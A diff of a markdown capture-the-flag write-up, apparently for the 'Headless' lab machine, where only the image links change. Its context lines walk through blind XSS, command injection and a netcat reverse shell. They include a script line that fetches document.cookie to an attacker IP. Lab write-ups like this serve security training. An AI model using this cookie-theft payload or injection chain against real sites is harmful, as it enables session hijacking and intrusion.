@@ -34,23 +34,23 @@ SINCE IT IS RUNNING ON PYTHON FIRST VULN CAME TO MY MIND IS SSTI
 
 TESTED BASIC SSTI AND WE CAN SOME ERROR
 
-![image.png](HEADLESS%201b9862a159368068b710fa4cdfe435a9/image.png)
+![image.png]image.png)
 
 IT SAYS YOUR BROWSER INFO WILL BE SHARED WITH ADMINSTRATOR
 
 Trying a simple blind xss payload
 
-![image.png](HEADLESS%201b9862a159368068b710fa4cdfe435a9/image%201.png)
+![image.png]image%201.png)
 
 WE GOT A PING FROM THW WEB SERVER
 
-![image.png](HEADLESS%201b9862a159368068b710fa4cdfe435a9/image%202.png)
+![image.png]image%202.png)
 
 STEALING THE COOKIES
 
-![image.png](HEADLESS%201b9862a159368068b710fa4cdfe435a9/image%203.png)
+![image.png]image%203.png)
 
-![image.png](HEADLESS%201b9862a159368068b710fa4cdfe435a9/image%204.png)
+![image.png]image%204.png)
 
 ```bash
 <script> 
@@ -63,22 +63,22 @@ fetch('http://10.10.16.3:80/?cookie='+document.cookie)
 
 NOW NAVIGATING TO THE dashboard we got page with the cookie
 
-![image.png](HEADLESS%201b9862a159368068b710fa4cdfe435a9/image%205.png)
+![image.png]image%205.png)
 
 Here is a simple generate report functionality
 
-![image.png](HEADLESS%201b9862a159368068b710fa4cdfe435a9/image%206.png)
+![image.png]image%206.png)
 
 IT USES A DATE POST PARAMETER MAYBE THEY RUN SOME SCRIPTS IN BACKGROUNG SO TRYING COMMAND INJECTION
 
-![image.png](HEADLESS%201b9862a159368068b710fa4cdfe435a9/image%207.png)
+![image.png]image%207.png)
 
 NOW GETTING A REVERSE SHELL USING NC
 
-![image.png](HEADLESS%201b9862a159368068b710fa4cdfe435a9/image%208.png)
+![image.png]image%208.png)
 
-![image.png](HEADLESS%201b9862a159368068b710fa4cdfe435a9/image%209.png)
+![image.png]image%209.png)
 
-![image.png](HEADLESS%201b9862a159368068b710fa4cdfe435a9/image%2010.png)
+![image.png]image%2010.png)
 
 GOT THE USERS FLAG
